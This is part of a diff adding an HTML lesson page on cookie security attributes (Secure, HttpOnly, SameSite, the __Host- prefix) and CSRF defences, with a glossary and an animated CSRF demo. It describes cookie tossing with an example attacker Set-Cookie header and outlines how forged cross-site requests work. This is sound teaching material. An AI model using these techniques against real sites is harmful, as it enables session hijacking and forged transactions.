+        <tr><td class="gold">SameSite=Lax</td><td class="hl">Cross-site forged sub-resource/form requests (classic CSRF)</td><td class="neg">Any site can trigger a state-changing request that carries the victim's cookie</td><td>CSRF via state-changing GET endpoints reachable through a top-level nav; XSS entirely</td></tr>
+        <tr><td class="gold">SameSite=Strict</td><td class="hl">All cross-site cookie attachment, including top-level nav</td><td class="neg">(same as Lax, plus normal cross-site link clicks also leak session state)</td><td>Breaks legitimate cross-site entry via email/bookmark links; not itself an XSS or sniffing defense</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout purple reveal">
+    <div class="callout-title">🔑 The One Table Worth Memorizing</div>
+    Notice the "does NOT protect against" column is never empty. There is no single attribute that is a general-purpose "make this cookie safe" switch — each one answers a narrow, specific question about one specific attacker capability. A cookie with <code>Secure</code> but no <code>HttpOnly</code> is still fully stealable by an XSS bug. A cookie with <code>HttpOnly</code> but no <code>SameSite</code> is still forgeable by a CSRF attack. Real production cookies use all three together precisely because they defend against three attackers who don't need each other's permission to try.
+  </div>
+
+  <div class="sidenote reveal">
+    <b>You can see all three flags on any real site right now.</b> Open DevTools (F12), go to the Application panel (Chrome/Edge) or Storage panel (Firefox), and select Cookies under a site you're logged into. Real dedicated columns show <code>Secure</code>, <code>HttpOnly</code>, and <code>SameSite</code> per cookie, no guessing required. Then flip to the Console tab and run <code>document.cookie</code> — you'll see it returns a string containing every non-HttpOnly cookie, and conspicuously omits any that are. That gap between what <code>document.cookie</code> shows and what the Cookies panel lists is HttpOnly, made visible.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 5b: COOKIE PREFIXES -->
+<section id="prefixes">
+<div class="container">
+  <div class="section-num">06 — A Fourth, Quieter Fix</div>
+  <h2>Cookie Prefixes: <span class="accent">__Host-</span> and <span class="accent">__Secure-</span></h2>
+
+  <p class="reveal">Everything so far controls how a cookie is <em>sent</em>. This last one controls something upstream of that: what a script or a sibling subdomain is even allowed to <em>set</em> in the first place — because it turns out "which cookie does the server think it received" has its own attack, independent of Secure, HttpOnly, and SameSite entirely.</p>
+
+  <div class="fix-panel reveal">
+    <div class="fix-card attack">
+      <div class="fix-badge">⚔️ The Attack</div>
+      <h4>Cookie Tossing (Subdomain Cookie Injection)</h4>
+      <p>Recall from the previous lesson that cookie matching is based on <em>name + domain + path</em>, not on which host actually set the cookie. If <code>bank.com</code> reads a cookie named <code>session_id</code>, and an attacker controls — or has compromised via XSS — any subdomain like <code>promo.bank.com</code>, that attacker can set their own <code>Set-Cookie: session_id=attacker_controlled_value; Domain=bank.com; Path=/</code>. Depending on ordering and matching rules, the browser may now send the attacker's forged <code>session_id</code> to <code>bank.com</code> instead of, or alongside, the legitimate one — effectively "tossing" a cookie in from the side, past a boundary the application never suspected it needed to defend. The application code has no way to know, just from reading <code>Cookie: session_id=...</code>, that the value didn't originate from the same trusted login flow.</p>
+    </div>
+    <div class="fix-card defense">
+      <div class="fix-badge">🛡️ The Fix</div>
+      <h4>__Host- Prefix</h4>
+      <p>A cookie name starting with the literal prefix <code>__Host-</code> comes with browser-enforced rules baked into the name itself: the <code>Set-Cookie</code> header <strong>must</strong> include <code>Secure</code>, <strong>must not</strong> include a <code>Domain</code> attribute (host-only, matching Section 04 of the previous lesson), and <strong>must</strong> set <code>Path=/</code>. If any of those three conditions are violated, the browser silently refuses to store the cookie at all. Because <code>Domain</code> is forbidden, only <code>bank.com</code> itself — never <code>promo.bank.com</code> or any other subdomain — could ever have legitimately set a cookie named <code>__Host-session_id</code>. The prefix turns a convention into something the browser actively polices.</p>
+    </div>
+  </div>
+
+  <pre class="reveal"><span class="tag">HTTP Response Header</span><code><span class="hdr">Set-Cookie:</span> <span class="att">__Host-session_id</span>=8f14e45fceea167a5a36dedd4bea2543; Secure; HttpOnly; SameSite=Lax; Path=/</code></pre>
+
+  <div class="data-table-wrap reveal">
+    <table>
+      <thead><tr><th>Prefix</th><th>Enforced requirements</th><th>Guarantees</th></tr></thead>
+      <tbody>
+        <tr><td class="gold">__Secure-</td><td class="hl">Set-Cookie must include Secure</td><td>Cookie was set over HTTPS — weaker guarantee, Domain still allowed</td></tr>
+        <tr><td class="gold">__Host-</td><td class="hl">Must include Secure, no Domain attribute, Path=/</td><td>Cookie is strictly host-only — no subdomain could have set it, closing the cookie-tossing vector entirely</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="sidenote reveal">
+    <b>Why isn't this just called "HostOnly" as a real attribute?</b> Because putting the guarantee in the <em>name</em>, not a separate attribute, means any code anywhere that reads <code>document.cookie</code> or logs raw <code>Set-Cookie</code> headers can see the guarantee at a glance, without cross-referencing attribute lists — and more importantly, a server can trust the name itself as proof the browser already validated the constraints before ever storing it. This mirrors the same "widen the domain deliberately or accept the narrower default" trade-off from the previous lesson's domain-scoping section — <code>__Host-</code> is simply the mechanism for a site that wants to guarantee it's opted into the narrowest possible scope, permanently.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 6: DEFENSE IN DEPTH -->
+<section id="defenseindepth">
+<div class="container">
+  <div class="section-num">07 — Beyond the Three Attributes</div>
+  <h2>Why <span class="accent">Defense in Depth</span> Still Matters</h2>
+
+  <p class="reveal">Even with <code>Secure</code>, <code>HttpOnly</code>, and <code>SameSite=Lax</code> all correctly set, a genuinely determined or well-positioned attacker isn't fully locked out — which is exactly why real systems layer additional protections on top rather than treating cookie attributes as the finish line.</p>
+
+  <div class="compare-grid reveal">
+    <div class="compare-card good">
+      <h4>🧾 CSRF Tokens (Synchronizer Pattern)</h4>
+      A random, per-session token embedded as a hidden form field and validated server-side on every state-changing request. Because the Same-Origin Policy stops a cross-site attacker's script from reading the victim's page, the attacker can never learn the correct token value to forge a request with — a defense that works even against browsers that predate the SameSite default.
+    </div>
+    <div class="compare-card bad">
+      <h4>🧬 SameSite=Lax Still Allows GET</h4>
+      Lax explicitly permits cross-site top-level GET navigations, so a state-changing action ever exposed behind a plain GET endpoint (an old anti-pattern, but it still exists in the wild) can still be triggered from an attacker's link. This is a standing argument for never putting a state change behind GET, independent of any cookie attribute.
+    </div>
+  </div>
+
+  <p class="reveal">HttpOnly's limits point in the same direction: it stops the simplest cookie-exfiltration pivot, but an XSS bug that can run <code>fetch()</code> with credentials can still perform actions as the victim in real time, cookie theft or not. That's why the origin-security material in this project — the Same-Origin Policy and CORS coverage, and the CSP module (<code>B13_csp</code>) — treats stopping the injection itself as the actual first line of defense, with HttpOnly and SameSite as the safety net for when that first line fails.</p>
+
+  <h3>The double-submit cookie pattern, for when there's no server-side session</h3>
+  <p class="reveal">The synchronizer pattern above has one dependency worth naming: it requires the server to remember the expected token somewhere — session state. That's a non-issue for a traditional session-cookie app, but it's an awkward fit for stateless APIs authenticated with a JWT, where the whole point is often to avoid server-side session storage. The <strong>double-submit cookie</strong> pattern solves CSRF without that dependency: the server sets a second, random token in a cookie that is <em>not</em> HttpOnly (deliberately, so JavaScript on the legitimate page can read it), and the page's own script reads that cookie value and resends it as a custom header or form field on every state-changing request. The server then just checks that the header value matches the cookie value — no session lookup required.</p>
+
+  <div class="callout cyan reveal">
+    <div class="callout-title">🔑 Why This Still Stops CSRF Even Though the Attacker Can See the Cookie Exists</div>
+    The attacker's forged cross-site form can trigger the browser to send the double-submit cookie automatically (same as any other cookie, subject to the SameSite rules already covered) — but the attacker's page runs on a <em>different origin</em>, and the Same-Origin Policy blocks it from reading that cookie's value with its own script to copy into the required header. It can cause the cookie to be attached; it cannot read what's inside it to forge the matching header. The two independent channels — the automatically-attached cookie and the JavaScript-read-and-resubmitted header — are exactly what an attacker's cross-origin page cannot both control at once.
+  </div>
+
+  <p class="reveal">This is also the direction the CSRF token demo in this project's <code>B17_cookies</code> module points toward as a "sharpen your pencil" exercise: design a CSRF defense for a JWT stored in a cookie, without server-side state. Double-submit is that answer — and it's a good illustration of how <code>HttpOnly</code> and CSRF-defense strategy actively trade off against each other: the double-submit token cookie is deliberately <em>not</em> HttpOnly, because the whole scheme depends on JavaScript being able to read it, while the actual session/auth cookie right next to it should still be HttpOnly. Not every cookie in an application needs — or should have — identical attributes.</p>
+
+  <div class="callout red reveal">
+    <div class="callout-title">🎯 The One-Sentence Summary</div>
+    <strong>Secure stops your cookie from leaking over the wire, HttpOnly stops it from leaking through injected JavaScript, and SameSite stops it from being weaponized by a request you never intended to send — three independent locks on three independent doors, and skipping any one of them leaves that specific door wide open no matter how well the other two are secured.</strong>
+  </div>
+</div>
+</section>
+
+<!-- SECTION 7: GLOSSARY -->
+<section id="glossary">
+<div class="container">
+  <div class="section-num">08 — Quick Reference</div>
+  <h2>Glossary &amp; <span class="accent">Key Terms</span></h2>
+
+  <div class="glossary-grid reveal">
+    <div class="glossary-card"><div class="glossary-term">Secure</div><div class="glossary-def">Cookie attribute restricting transmission to HTTPS connections only, closing plaintext network sniffing and downgrade attacks.</div></div>
+    <div class="glossary-card"><div class="glossary-term">HttpOnly</div><div class="glossary-def">Cookie attribute hiding the cookie from JavaScript's document.cookie, closing the most common XSS session-theft pivot.</div></div>
+    <div class="glossary-card"><div class="glossary-term">SameSite</div><div class="glossary-def">Cookie attribute controlling whether the cookie is sent on cross-site requests, closing classic CSRF. Values: Strict, Lax, None.</div></div>
+    <div class="glossary-card"><div class="glossary-term">CSRF (Cross-Site Request Forgery)</div><div class="glossary-def">An attack where a malicious site triggers a request to another site, relying on the victim's browser to auto-attach valid session cookies.</div></div>
+    <div class="glossary-card"><div class="glossary-term">XSS (Cross-Site Scripting)</div><div class="glossary-def">An attack where malicious script gets injected into and executed within a trusted page's own origin, e.g. via unescaped user input.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Top-Level Navigation</div><div class="glossary-def">A request that changes the browser's address bar / main document, as opposed to a background sub-resource request like an image or fetch.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Cross-Site Request</div><div class="glossary-def">A request whose initiating site differs from its destination site — the classification SameSite uses to decide cookie eligibility.</div></div>
+    <div class="glossary-card"><div class="glossary-term">CSRF Token (Synchronizer Pattern)</div><div class="glossary-def">A random, session-tied value embedded in forms and validated server-side, defending against CSRF independently of SameSite.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Session Hijacking</div><div class="glossary-def">Using a stolen valid session identifier (e.g. via XSS cookie theft) to impersonate a logged-in user without their password.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Defense in Depth</div><div class="glossary-def">Layering multiple independent protections so that failure of any single one doesn't fully compromise the system.</div></div>
+    <div class="glossary-card"><div class="glossary-term">__Host- Prefix</div><div class="glossary-def">A cookie-name prefix the browser enforces at storage time — requires Secure, no Domain, and Path=/ — guaranteeing the cookie is strictly host-only and closing cookie tossing.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Cookie Tossing</div><div class="glossary-def">An attack where a malicious or compromised subdomain sets a cookie with the same name as a parent domain's cookie, exploiting name+domain+path matching that ignores which host actually set it.</div></div>
+  </div>
+</div>
+</section>
+
+<footer>
+  <p>Secure, HttpOnly, SameSite: The Security Bug Each Attribute Fixes — companion lesson for bob_os/browser module B17_cookies</p>
+  <p style="margin-top:.5rem;font-size:.78rem">Three attributes, three attackers, zero substitutes for each other.</p>
+</footer>
+
+<script>
+const C={bg:'#060d1a',bg2:'#0b0f1a',bg3:'#1a2235',border:'#1e3a5f',gold:'#f5c842',cyan:'#38bdf8',teal:'#0d9488',red:'#f87171',green:'#4ade80',purple:'#a78bfa',muted:'#7a9bbf',orange:'#fb923c',text:'#e2e8f0'};
+
+function dpr(canvas,w,h){const d=window.devicePixelRatio||1;canvas.width=w*d;canvas.height=h*d;canvas.style.width=w+'px';canvas.style.height=h+'px';const ctx=canvas.getContext('2d');ctx.scale(d,d);return ctx;}
+function gW(c){return c.parentElement.getBoundingClientRect().width;}
+
+// ── CSRF ATTACK CANVAS ──────────────────────────────────────────────────────────
+function drawCSRFScene(t,phase,mode){
+  const canvas=document.getElementById('csrfCanvas');
+  const W=gW(canvas),H=320;
+  const ctx=dpr(canvas,W,H);
+  ctx.fillStyle=C.bg;ctx.fillRect(0,0,W,H);
+
+  const evilW=W*0.30, midX=evilW, midW=W*0.20, bankX=evilW+midW, bankW=W-bankX;
+
+  // evil.com box
+  ctx.fillStyle='rgba(248,113,113,.08)';ctx.fillRect(0,20,evilW,H-70);
+  ctx.strokeStyle=C.red;ctx.lineWidth=1.5;ctx.strokeRect(2,20,evilW-4,H-70);
+  ctx.fillStyle=C.red;ctx.font='bold 12px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText('evil.com',evilW/2,40);
+  ctx.font='10px Source Code Pro,monospace';ctx.fillStyle=C.muted;
+  ctx.fillText('hidden auto-submit form',evilW/2,58);
+
+  // browser wall (middle)
+  ctx.fillStyle='rgba(122,155,191,.08)';ctx.fillRect(midX,20,midW,H-70);
+  ctx.strokeStyle=C.muted;ctx.setLineDash([4,4]);ctx.strokeRect(midX+1,20,midW-2,H-70);ctx.setLineDash([]);
+  ctx.save();ctx.translate(midX+midW/2,H/2-20);ctx.rotate(-Math.PI/2);
+  ctx.fillStyle=C.muted;ctx.font='9px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText('BROWSER COOKIE JAR',0,0);ctx.restore();
+  ctx.fillStyle=C.gold;ctx.font='9px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText(mode==='lax'?'SameSite=Lax':'no SameSite',midX+midW/2,H/2+30);
+
+  // bank.com box
+  ctx.fillStyle='rgba(74,222,128,.06)';ctx.fillRect(bankX,20,bankW,H-70);
+  ctx.strokeStyle=C.green;ctx.lineWidth=1.5;ctx.strokeRect(bankX+2,20,bankW-4,H-70);
+  ctx.fillStyle=C.green;ctx.font='bold 12px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText('bank.com',bankX+bankW/2,40);
+  ctx.font='10px Source Code Pro,monospace';ctx.fillStyle=C.muted;
+  ctx.fillText('/transfer endpoint',bankX+bankW/2,58);
+
+  const blocked=(mode==='lax');
+  const captions={
+    idle:'Choose a scenario below to run it',
+    submit:'Hidden form auto-submits POST to bank.com/transfer',
+    check:blocked?'Browser checks: cross-site + not a safe top-level GET → withhold cookie':'Browser checks: does a cookie match bank.com? → yes, attach it',
+    arrive:blocked?'Request arrives at bank.com with NO session cookie':'Request arrives at bank.com WITH the victim’s session cookie',
+    result:blocked?'403 / treated as unauthenticated — transfer REJECTED':'Server treats it as authenticated — transfer SUCCEEDS (attack works)'
+  };
+  ctx.fillStyle=C.text;ctx.font='12px Lato,sans-serif';ctx.textAlign='center';
+  ctx.fillText(captions[phase]||'',W/2,H-16);
+
+  let dotX=evilW*0.5, dotY=H/2-20, dotCol=C.red, dotLabel='';
+  if(phase==='submit'){ dotX=evilW*0.5+(evilW*0.3)*t; dotCol=C.red; dotLabel='POST /transfer'; }
+  else if(phase==='check'){ dotX=evilW+midW*t; dotCol=blocked?C.orange:C.gold; dotLabel=blocked?'cookie withheld ✕':'cookie attached ✓'; }
+  else if(phase==='arrive'){ dotX=bankX+bankW*0.15+bankW*0.15*t; dotCol=blocked?C.green:C.red; dotLabel=blocked?'no session cookie':'session cookie present'; }
+  else if(phase==='result'){ dotX=bankX+bankW*0.5; dotCol=blocked?C.green:C.red; dotLabel=blocked?'✓ blocked':'✗ transfer succeeded'; }
+
+  if(phase!=='idle'){
+    ctx.beginPath();ctx.arc(dotX,dotY,8,0,Math.PI*2);ctx.fillStyle=dotCol;ctx.fill();
+    ctx.strokeStyle='#fff';ctx.lineWidth=1;ctx.stroke();
+    ctx.fillStyle=dotCol;ctx.font='10px Source Code Pro,monospace';ctx.textAlign='center';
+    ctx.fillText(dotLabel,dotX,dotY-16);
+  }
+
+  ctx.strokeStyle='rgba(122,155,191,.3)';ctx.setLineDash([4,4]);ctx.lineWidth=1;
+  ctx.beginPath();ctx.moveTo(evilW*0.5,H/2-20);ctx.lineTo(bankX+bankW*0.5,H/2-20);ctx.stroke();ctx.setLineDash([]);
+}
+
+function runCSRF(mode){
+  const phases=['submit','check','arrive','result'];
+  const durations=[500,600,500,600];
+  let idx=0,start=performance.now();
+  document.getElementById('csrfLabel').textContent='▶ Running '+(mode==='lax'?'protected (SameSite=Lax)':'unprotected (no SameSite)')+' scenario…';
+  function step(now){
+    const elapsed=now-start;
+    const t=Math.min(1,elapsed/durations[idx]);
+    drawCSRFScene(t,phases[idx],mode);
+    if(t>=1){
+      idx++;
+      if(idx>=phases.length){
+        document.getElementById('csrfLabel').textContent='▶ Complete — '+(mode==='lax'?'attack blocked':'attack succeeded')+'. Choose a scenario to run again';
+        return;
+      }
+      start=now;
+    }
+    requestAnimationFrame(step);
+  }
+  requestAnimationFrame(step);
+}
+function resetCSRF(){
+  document.getElementById('csrfLabel').textContent='▶ Choose a scenario below to run it';
+  drawCSRFScene(0,'idle','none');
+}
+
+// ── SCROLL REVEAL ──────────────────────────────────────────────────────────────
+const obs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('visible');});},{threshold:.07});
+document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+const secs=document.querySelectorAll('section[id]');
+const dots=document.querySelectorAll('.toc-dot');
+const tocObs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){dots.forEach(d=>d.classList.remove('active'));const d=document.querySelector(`.toc-dot[href="#${e.target.id}"]`);if(d)d.classList.add('active');}});},{threshold:.4});
+secs.forEach(s=>tocObs.observe(s));
+
+window.addEventListener('load',()=>{ resetCSRF(); });
+window.addEventListener('resize',()=>{ drawCSRFScene(0,'idle','none'); });
+</script>
+</body>
+</html>
